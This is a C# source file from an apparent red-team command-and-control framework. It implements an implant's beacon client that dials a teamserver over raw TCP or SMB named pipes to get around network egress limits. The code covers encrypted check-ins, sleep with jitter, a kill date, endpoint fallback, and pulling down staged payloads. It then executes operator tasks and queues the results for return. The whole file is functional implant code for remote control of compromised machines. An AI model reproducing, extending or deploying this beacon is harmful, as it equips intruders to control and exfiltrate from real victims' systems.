using System.Net;
using System.Net.Sockets;
using System.IO.Pipes;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The reference implant's socket check-in client (architecture.md Sec 8):
// the stream check-in contract over the transports a no-egress segment still
// allows -- a raw TCP socket (tcp://host:port) or a named pipe
// (smb://host/pipe/name; a dot host is the local machine). One connection is
// one poll check-in: dial, handshake, exchange one framed message each way,
// close, sleep the cadence, reconnect. The carrier is poll-only -- no live
// stream exists to hold -- and the interactive verbs ride the shared
// store-and-forward carriage (PollChannels) every poll client runs. A whole
// source-file module like its siblings: the build unit drops this file from
// builds whose walk holds no socket-schemed entry to dial.

/// <summary>
/// Builds the socket check-in client off the shared setup; the factory the
/// generated transport selection names for tcp:// and smb:// beacon entries.
/// </summary>
internal static class SocketCheckIn
{
    public static ICheckInClient Create(CheckInSetup setup) => new SocketBeacon(
        setup.Egress,
        setup.Enrollment.ImplantId,
        setup.Enrollment.CAs,
        setup.Config.Sleep,
        setup.Config.Jitter,
        setup.Config.HasKillDate ? setup.Config.KillDate : null,
        setup.Enroll,
        setup.Config.ClassVerbs,
        setup.Log,
        setup.Config.Transport,
        setup.Nonces,
        setup.Cadence,
        setup.Held);
}

/// <summary>
/// Runs the implant's check-in lifecycle over the socket wire: dial the
/// connection, run the envelope's own request/response cycle -- the request
/// message carrying the handshake and every accumulated upstream frame, the
/// response carrying the handshake response, staged answers, and queued
/// tasking -- then close, sleep the baked cadence, and reconnect. A dropped
/// connection is a reconnect, not a termination.
/// </summary>
internal sealed class SocketBeacon : ICheckInClient
{
    private readonly EgressEndpoints _egress;
    private readonly string _implantId;
    private readonly IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> _cas;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;
    private readonly TaskNonceTracker _nonces;
    private readonly Cadence? _cadence;
    private readonly FrontedPivots? _fronted;
    private readonly HeldTaskLedger _held;
    private readonly BeaconTasking _tasking;

    // The store-and-forward channel carriage (PollChannels): the socket
    // carrier is poll-only, so every channel batches through it.
    private readonly PollChannels _poll;

    // The per-artifact check-in seal (architecture.md Sec 8/9): the baked key
    // split into its id and key halves, present only when the bake asked for
    // sealed check-ins -- the same application-layer confidentiality the
    // cleartext http posture carries, wrapping every message this wire
    // exchanges.
    private readonly (byte[] KeyId, byte[] Key)? _seal;

    // The check-in counter: incremented before every cycle attempt, so a
    // retransmitted batch after a lost response still carries a fresh value
    // (the server refuses a counter at or below its floor) while the batch
    // semantics make the retransmission itself idempotent.
    private long _checkInCounter;

    // The sealed check-in counter's size in bytes: an 8-byte big-endian
    // integer, the same width the teamserver's floor reads.
    private const int CounterBytes = 8;

    // The purpose tags binding each sealed body to its direction, the exact
    // strings the teamserver's AesGcmEnvelope carries: a sealed request can
    // never be reflected as a response and vice versa.
    private const string CheckInRequestAad = "rod-checkin-v1";
    private const string CheckInResponseAad = "rod-checkin-response-v1";

    // The staged tasks whose StagedPull frames ride the batch, in demand
    // order: the response answers each demand with its chunk run before any
    // new tasking, so this list is the key to reading the response back.
    private readonly List<string> _demands = new();

    // The staged tasks awaiting their chunk run, keyed by task id: a task
    // accepted in one response is demanded on the next request and dispatches
    // when its terminal chunk arrives.
    private readonly Dictionary<string, TaskRequest> _stagedAwaiting = new();

    public SocketBeacon(
        EgressEndpoints egress,
        string implantId,
        IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> cas,
        TimeSpan sleep,
        TimeSpan jitter,
        DateTimeOffset? killDate,
        EnrollBundle? enroll,
        IReadOnlyList<string> classVerbs,
        TextWriter log,
        TransportProfile? transport = null,
        TaskNonceTracker? nonces = null,
        Cadence? cadence = null,
        HeldTaskLedger? held = null)
    {
        _egress = egress;
        _implantId = implantId;
        _cas = cas;
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
        _cadence = cadence;
        _fronted = enroll?.Fronted;
        _classVerbs = classVerbs;
        _log = log;
        _nonces = nonces ?? new TaskNonceTracker();
        _held = held ?? new HeldTaskLedger();
        _poll = new PollChannels(_held, log);
        _seal = transport is { SealsCheckIns: true }
            ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
            : null;
        // Batch discipline: results queue for the next cycle, so the
        // delivery mark waits for the batch to cross (the envelope's own
        // rule, not the wire writer's).
        _tasking = new BeaconTasking(
            _implantId, _cas, _fronted, _nonces, _held, _handlers, _log,
            markResultsOnWrite: false);
    }

    /// <summary>
    /// This client carries the socket dial shapes: a tcp-schemed URL names
    /// the raw socket, an smb-schemed one the named pipe.
    /// </summary>
    public bool Serves(string beaconUrl) => BeaconUrl.IsSocket(beaconUrl);

    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
    {
        try
        {
            return await RunCyclesAsync(cancellationToken);
        }
        finally
        {
            // The run is ending: the poll carriage's channels end with it.
            await _poll.DisposeAsync();
        }
    }

    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return CheckInExit.Terminate;
            }
            if (!BeaconUrl.IsSocket(_egress.CurrentBeaconUrl))
                return CheckInExit.SwitchTransport;

            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                _log.WriteLine($"socket check-in failed: {ex.Message}");
                // The cycle died before its response: the batch's frames
                // stay queued (delivered clears only on a crossed response),
                // so the next cycle re-sends them whole -- first-wins
                // server-side.
            }

            if (cycle == BeaconCycleResult.Terminal)
                return CheckInExit.Terminate;

            if (cycle == BeaconCycleResult.Handshaken)
            {
                consecutiveFailures = 0;
            }
            else
            {
                consecutiveFailures++;
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return CheckInExit.Terminate;
            }
        }
        return CheckInExit.Terminate;
    }

    // One connection, one check-in -- the envelope's own cycle shape over
    // the socket wire: one request message (the handshake first, then every
    // upstream frame the run accumulated), one response message (the
    // handshake response, staged chunk runs answering the request's
    // demands, queued tasking), close. Throws on transport errors (the
    // caller logs and retries); a refused handshake returns Terminal.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        using var wire = await SocketWire.ConnectAsync(_egress.CurrentBeaconUrl, cancellationToken)
            .ConfigureAwait(false);

        // The batch snapshot: the handshake plus everything accumulated.
        // The demand order rides the request, and the delivered frames clear
        // only after the response is processed -- a failed cycle re-sends
        // the batch whole, and the server treats a retransmitted result for
        // an already-completed task as a no-op. The held snapshot rides the
        // same discipline: results the acceptance queued mark delivered only
        // when the batch crossed.
        var demandOrder = _demands.ToList();
        var pending = _poll.SnapshotPending();
        var sending = _held.Undelivered();
        var frames = new List<Frame>(1 + pending.Count);
        var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
        // The store-and-forward channel carriage rides the advertisement:
        // the server's parking hub reads it off the session and parks
        // operator input for the cycles to carry.
        handshake.Capabilities.Add(PollChannels.Capability);
        frames.Add(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });
        frames.AddRange(pending);

        // The sealed body (the default build shape): the framed bytes behind
        // a fresh big-endian counter, all AES-256-GCM under the baked
        // per-artifact key -- the same application-layer seal the cleartext
        // http posture carries, so a bare socket or pipe leaks no frame
        // bytes either. The counter burns on every attempt, not every
        // delivery, so the retransmission above never trips the server's
        // replay floor. The plaintext lab bake sends the frames as-is.
        var encoded = EnvelopeCodec.Encode(frames);
        byte[] requestBody;
        if (_seal is { } seal)
        {
            var plaintext = new byte[CounterBytes + encoded.Length];
            System.Buffers.Binary.BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_checkInCounter);
            encoded.AsSpan().CopyTo(plaintext.AsSpan(CounterBytes));
            requestBody = EnvelopeWire.SealCheckInBody(plaintext, seal.KeyId, seal.Key, CheckInRequestAad);
        }
        else
        {
            requestBody = encoded;
        }
        await wire.WriteBodyAsync(requestBody, CancellationToken.None);

        var responseBody = await wire.ReadBodyAsync(cancellationToken);
        if (responseBody.Length == 0)
            throw new InvalidOperationException("the socket closed before the handshake response");
        if (_seal is { } open)
        {
            // A sealed cycle answers sealed: a body that does not verify
            // under the key this artifact carries is a dropped cycle, not a
            // parse -- nothing inside it is acted on.
            responseBody = EnvelopeWire.TryOpenCheckInBody(responseBody, open.KeyId, open.Key, CheckInResponseAad)
                ?? throw new InvalidOperationException("check-in response did not verify under the baked key");
        }
        var inbound = EnvelopeCodec.Parse(responseBody);
        if (inbound.Count == 0)
            throw new InvalidOperationException("the check-in response carried no frames");
        var response = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
        if (response.Status != HandshakeStatus.Ok)
        {
            _log.WriteLine($"handshake refused: {response.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _nonces.Negotiated = response.ReplayNonces;
        _log.WriteLine($"handshake ok: engagement={response.EngagementId}, replay-nonces={response.ReplayNonces}");

        // The batch crossed with the response: clear exactly what was
        // flushed, mark the held results the batch carried, retire the
        // demands this response answered, then process the response past
        // its handshake.
        _poll.MarkDelivered(pending);
        foreach (var remembered in sending)
            _held.MarkDelivered(remembered.TaskId);
        _demands.Clear();
        ProcessResponse(inbound, demandOrder, response.TaskAcks);
        return BeaconCycleResult.Handshaken;
    }

    // Reads a response message past its handshake -- the envelope's own
    // processing shape: the staged chunk runs in demand order (the server
    // answers each demand before any new tasking), then the queued
    // TaskRequests and ChannelInput frames.
    private void ProcessResponse(IReadOnlyList<Frame> inbound, IReadOnlyList<string> demandOrder, bool acks)
    {
        var index = 1;

        // The staged half: each demand's chunk run, terminal-flagged. A run
        // that never terminates is a protocol break -- report the staged
        // task Failed and move on.
        foreach (var demand in demandOrder)
        {
            var parts = new List<byte[]>();
            var total = 0;
            var terminal = false;
            while (index < inbound.Count && !terminal)
            {
                StagedChunk chunk;
                try
                {
                    chunk = StagedChunk.Parser.ParseFrom(inbound[index].Payload);
                }
                catch (InvalidProtocolBufferException)
                {
                    break;
                }
                if (chunk.TaskId != demand)
                    break;
                index++;
                parts.Add(chunk.Data.ToArray());
                total += chunk.Data.Length;
                terminal = chunk.Terminal;
            }

            if (!_stagedAwaiting.Remove(demand, out var task))
                continue;
            if (!terminal)
            {
                _log.WriteLine($"task {demand}: staged chunk run ended without a terminal chunk");
                _poll.QueueResult(task.TaskId, TaskOutcome.Failed,
                    "staged payload stream ended without a terminal chunk");
                continue;
            }

            var payload = new byte[total];
            var offset = 0;
            foreach (var part in parts)
            {
                part.CopyTo(payload, offset);
                offset += part.Length;
            }
            var (outcome, output) = _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
            _poll.QueueResult(task.TaskId, outcome, output);
        }

        // The tasking half: every remaining frame is a TaskRequest, or a
        // ChannelInput the server's parking hub delivered for a live
        // channel of this cycle.
        for (; index < inbound.Count; index++)
        {
            var frame = inbound[index];
            if (frame.Kind == FrameKind.ChannelInput)
            {
                _poll.RouteInput(frame);
                continue;
            }

            TaskRequest task;
            try
            {
                task = TaskRequest.Parser.ParseFrom(frame.Payload);
            }
            catch (InvalidProtocolBufferException)
            {
                _log.WriteLine("response frame was neither a staged chunk nor tasking; skipped");
                continue;
            }

            // The receive-ack arm is per check-in: delivery evidence for the
            // parsed frame, queued into the next request before anything
            // runs.
            if (acks)
                _poll.AddUpstream(BeaconFrames.AckFrame(task.TaskId));

            // The staged arm defers across cycles -- the demand rides the
            // next request, the chunk run its response -- the envelope
            // cycle's own shape, ahead of the shared inline acceptance.
            if (task.HasStagedBytes)
            {
                _held.Hold(task.TaskId);
                _stagedAwaiting[task.TaskId] = task;
                _demands.Add(task.TaskId);
                _poll.AddUpstream(new Frame
                {
                    Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
                    Kind = FrameKind.StagedPull,
                });
                continue;
            }

            // Inline and channel shapes: the shared acceptance, with the
            // write delegate queueing into the batch -- the server closes
            // after its response, so results ride the next request, and the
            // channel arm starts store-and-forward through the same
            // carriage either way.
            _ = _tasking.AcceptAsync(
                task,
                QueueUpstream,
                RefuseStagedOnTheWire,
                (started, handler) => _poll.StartChannel(started, handler),
                CancellationToken.None);
        }
    }

    // One frame into the next request's batch: the queueing write the shared
    // acceptance reports through, the poll-cycle answer to a wire that is
    // already closing.
    private Task QueueUpstream(Frame frame, CancellationToken cancellationToken)
    {
        _poll.AddUpstream(frame);
        return Task.CompletedTask;
    }

    // The staged arm is handled ahead of the acceptance; reaching this
    // delegate is an ordering break, not a transfer.
    private Task<(TaskOutcome Outcome, string Output)> RefuseStagedOnTheWire(
        TaskRequest task, CancellationToken cancellationToken)
        => throw new InvalidOperationException("the staged arm is handled ahead of the acceptance");
}

/// <summary>
/// The socket wire: one duplex stream over the dial the URL names -- a TCP
/// socket for tcp://host:port, a named pipe for smb://host/pipe/name (a dot
/// host is the local machine; a remote host is the Windows SMB pipe share)
/// -- carrying the stream check-in framing: one self-delimited message per
/// direction turn, a varint byte length then the envelope's delimited frame
/// sequence. No TLS and no client certificate ride it: the identity is the
/// id in the handshake (architecture.md Sec 8, the certificate-less
/// posture), so the segment's own reach is the boundary.
/// </summary>
internal sealed class SocketWire : IDisposable
{
    // The message budget: the envelope's wire-body cap, the same ceiling the
    // poll bridges enforce on a check-in message.
    private const int MaxMessageBytes = 16 * 1024 * 1024;

    // How long the dial itself may take: a poll cycle is bounded, and a
    // segment that cannot reach the endpoint fails the cycle, not the run.
    private static readonly TimeSpan ConnectTimeout = TimeSpan.FromSeconds(10);

    private readonly TcpClient? _client;
    private readonly Stream _stream;

    private SocketWire(TcpClient? client, Stream stream)
    {
        _client = client;
        _stream = stream;
    }

    /// <summary>Dials the socket beacon URL: the TCP or named-pipe endpoint it names.</summary>
    public static async Task<SocketWire> ConnectAsync(string beaconUrl, CancellationToken cancellationToken)
    {
        var uri = new Uri(beaconUrl);
        if (uri.Scheme.Equals("tcp", StringComparison.OrdinalIgnoreCase))
        {
            IPAddress[] addresses;
            if (IPAddress.TryParse(uri.Host, out var parsed))
                addresses = new[] { parsed };
            else
                addresses = await Dns.GetHostAddressesAsync(uri.Host, cancellationToken);
            var address = addresses.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)
                ?? addresses[0];

            using var bounded = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            bounded.CancelAfter(ConnectTimeout);
            var client = new TcpClient();
            try
            {
                await client.ConnectAsync(address, uri.Port, bounded.Token).ConfigureAwait(false);
                return new SocketWire(client, client.GetStream());
            }
            catch
            {
                client.Dispose();
                throw;
            }
        }

        if (uri.Scheme.Equals("smb", StringComparison.OrdinalIgnoreCase))
        {
            // smb://host/pipe/name: the UNC pipe path in URL form. A dot
            // (or empty) host is the local machine -- the shape a Unix dial
            // resolves and the one a listener on the same host serves; a
            // named host is the Windows SMB pipe share.
            var host = uri.Host.Length == 0 ? "." : uri.Host;
            var path = uri.AbsolutePath.TrimStart('/');
            const string pipePrefix = "pipe/";
            if (!path.StartsWith(pipePrefix, StringComparison.OrdinalIgnoreCase) || path.Length <= pipePrefix.Length)
                throw new InvalidOperationException(
                    $"the smb dial names no pipe: {beaconUrl} (expected smb://host/pipe/name)");
            var pipe = new NamedPipeClientStream(
                host, path[pipePrefix.Length..], PipeDirection.InOut, PipeOptions.Asynchronous);
            try
            {
                using var bounded = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
                bounded.CancelAfter(ConnectTimeout);
                await pipe.ConnectAsync((int)ConnectTimeout.TotalMilliseconds, bounded.Token).ConfigureAwait(false);
                return new SocketWire(null, pipe);
            }
            catch
            {
                pipe.Dispose();
                throw;
            }
        }

        throw new InvalidOperationException($"the socket dial names an unknown scheme: {beaconUrl}");
    }

    /// <summary>Writes one message body, varint-length-prefixed.</summary>
    public async Task WriteBodyAsync(byte[] body, CancellationToken cancellationToken)
    {
        var prefix = new byte[5];
        var value = (ulong)body.Length;
        var index = 0;
        while (value >= 0x80)
        {
            prefix[index++] = (byte)(value | 0x80);
            value >>= 7;
        }
        prefix[index++] = (byte)value;

        await _stream.WriteAsync(prefix.AsMemory(0, index), cancellationToken).ConfigureAwait(false);
        if (body.Length > 0)
            await _stream.WriteAsync(body, cancellationToken).ConfigureAwait(false);
        await _stream.FlushAsync(cancellationToken).ConfigureAwait(false);
    }

    /// <summary>Writes one message: the frames, varint-length-prefixed.</summary>
    public Task WriteFramesAsync(IReadOnlyList<Frame> frames, CancellationToken cancellationToken)
        => WriteBodyAsync(EnvelopeCodec.Encode(frames), cancellationToken);

    /// <summary>
    /// Reads one message body. A clean close reads as an empty body; a
    /// malformed or oversized message throws, dropping the connection.
    /// </summary>
    public async Task<byte[]> ReadBodyAsync(CancellationToken cancellationToken)
    {
        long length = 0;
        var shift = 0;
        while (true)
        {
            var one = new byte[1];
            if (await _stream.ReadAsync(one.AsMemory(), cancellationToken).ConfigureAwait(false) <= 0)
                return Array.Empty<byte>();
            length |= (long)(one[0] & 0x7f) << shift;
            if ((one[0] & 0x80) == 0)
                break;
            shift += 7;
            if (shift > 28)
                throw new InvalidOperationException("check-in length prefix is a malformed varint");
        }
        if (length > MaxMessageBytes)
            throw new InvalidOperationException("check-in message exceeds the body budget");

        var body = new byte[length];
        var offset = 0;
        while (offset < length)
        {
            var read = await _stream.ReadAsync(body.AsMemory(offset), cancellationToken).ConfigureAwait(false);
            if (read <= 0)
                throw new InvalidOperationException("the stream closed mid-message");
            offset += read;
        }
        return body;
    }

    /// <summary>
    /// Reads one message and parses its frames. A clean close reads as an
    /// empty list; a malformed or oversized body throws, dropping the
    /// connection.
    /// </summary>
    public async Task<IReadOnlyList<Frame>> ReadFramesAsync(CancellationToken cancellationToken)
        => EnvelopeCodec.Parse(await ReadBodyAsync(cancellationToken).ConfigureAwait(false));

    public void Dispose()
    {
        _stream.Dispose();
        _client?.Dispose();
    }
}
